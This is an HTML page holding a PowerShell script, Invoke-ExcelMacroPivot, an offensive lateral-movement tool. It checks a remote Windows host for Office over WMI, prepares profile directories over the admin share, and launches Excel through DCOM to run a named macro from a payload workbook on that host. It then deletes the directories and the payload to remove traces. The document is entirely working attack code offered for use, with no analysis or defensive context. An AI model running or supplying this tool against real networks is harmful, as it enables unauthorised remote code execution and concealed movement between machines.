<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Invoke-ExcelMacroPivot.ps1</title>
</head><body>function Invoke-ExcelMacroPivot{<br/>
&lt;#<br/>
&nbsp; &nbsp; .AUTHOR<br/>
&nbsp; &nbsp; &nbsp; &nbsp;Matt Nelson (@enigma0x3)<br/>
&nbsp; &nbsp; .SYNOPSIS<br/>
&nbsp; &nbsp; &nbsp; &nbsp;Pivots to a remote host by using an Excel macro and Excel's COM object<br/>
&nbsp; &nbsp; .PARAMETER Target<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Remote host to pivot to<br/>
&nbsp; &nbsp; .PARAMETER RemoteDocumentPath<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Local path on the remote host where the payload resides<br/>
&nbsp; &nbsp; .PARAMETER MacroName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; The name of the macro residing in the payload document<br/>
&nbsp; &nbsp; .EXAMPLE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; PS C:\&gt; Invoke-ExcelMacroPivot -Target "192.168.99.152" -RemoteDocumentPath "C:\Book1.xlsm" -MacroName "Auto_Open"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Executes the "Auto_Open" macro from C:\Book1.xlsm on the host 192.168.99.152<br/>
&nbsp; &nbsp; <br/>
#&gt;<br/>
&nbsp; &nbsp; [CmdletBinding()]<br/>
&nbsp; &nbsp; param(<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory=$True, ValueFromPipeline=$True)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Target,<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $RemoteDocumentPath,<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $MacroName<br/>
&nbsp; &nbsp; )<br/>
<br/>
&nbsp; &nbsp; $32BitPath = "\\$target\c$\Windows\System32\config\systemprofile\Desktop"<br/>
&nbsp; &nbsp; $64BitPath = "\\$target\c$\Windows\SysWOW64\config\systemprofile\Desktop"<br/>
<br/>
&nbsp; &nbsp; #Connect to remote host via WMI for reg enumeration<br/>
&nbsp; &nbsp; try{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Connecting to StdRegProv on $target"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $remoteReg = [WMIClass]"\\$target\ROOT\default:StdRegProv"<br/>
&nbsp; &nbsp; }catch{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; throw "Could not connect to StdRegProv"<br/>
&nbsp; &nbsp; }<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; try{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Getting OS Architecture of $target"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $OSArch = @(Get-WmiObject -ComputerName $target -Query 'SELECT AddressWidth FROM Win32_Processor')[0] | Select-Object -ExpandProperty AddressWidth<br/>
&nbsp; &nbsp; }catch{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; throw "Could not get OS Arch."<br/>
&nbsp; &nbsp; }<br/>
&nbsp; &nbsp; <br/>
<br/>
&nbsp; &nbsp; #Check if Office is installed<br/>
&nbsp; &nbsp; $hklm = [uint32]'0x80000002'<br/>
&nbsp; &nbsp; $OfficeResult = $remoteReg.CheckAccess($hklm, 'SOFTWARE\Microsoft\Office',1)<br/>
<br/>
&nbsp; &nbsp; function Local:Prep-Target{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if ($OSArch -eq "64") {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; try {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Creating both 32 and 64 bit Profile directories"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [system.io.directory]::createDirectory($32BitPath)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [system.io.directory]::createDirectory($64BitPath)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } catch {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; throw "Unable to create directory"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; } elseif ($OSArch -eq "32") {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; try {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Creating 32 bit profile directory"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [system.io.directory]::createDirectory($32BitPath)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } catch {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; throw "Unable to create directory"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; } else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; throw "OS Arch not determined"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; } <br/>
<br/>
&nbsp; &nbsp; function Local:Cleanup-Target{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($OSArch -eq "64") {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; try{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Deleting both 32 and 64 bit profile directories"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [system.io.directory]::Delete($32BitPath)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [system.io.directory]::Delete($64BitPath)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } catch{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; throw "Unable to delete directory"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } elseif ($OSArch -eq "32") {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; try{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Deleting 32 bit profile directory"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [system.io.directory]::Delete($32BitPath)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } catch{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; throw "Unable to delete directory"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; try{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Deleting payload from $RemoteDocumentPath on $target"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $UNCPath = "\\$target\c$\" + $RemoteDocumentPath.Replace("C:\","")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [system.io.file]::Delete($UNCPath)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; } catch {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; throw "Unable to cleanup payload"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; }<br/>
<br/>
<br/>
&nbsp; &nbsp; If ($OfficeResult.BGranted -eq $True) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Prepping $target"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Prep-Target<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Activating Excel.Application on $target"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application",$target))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Opening payload"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $WorkBook = $Excel.Workbooks.Open($RemoteDocumentPath)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Executing Macro $MacroName from $RemoteDocumentPath"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Excel.Run($MacroName)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $WorkBook.Close()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Excel.Application.Quit()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Excel.Quit()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [System.Runtime.Interopservices.Marshal]::FinalReleaseComObject($Excel)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Sleeping 10 seconds for FinalReleaseCOMOBject() to finish"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Start-Sleep 10<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Cleaning up $target"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Cleanup-Target<br/>
&nbsp; &nbsp; } else{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; throw "Office not installed on target"<br/>
&nbsp; &nbsp; }<br/>
}</body></html>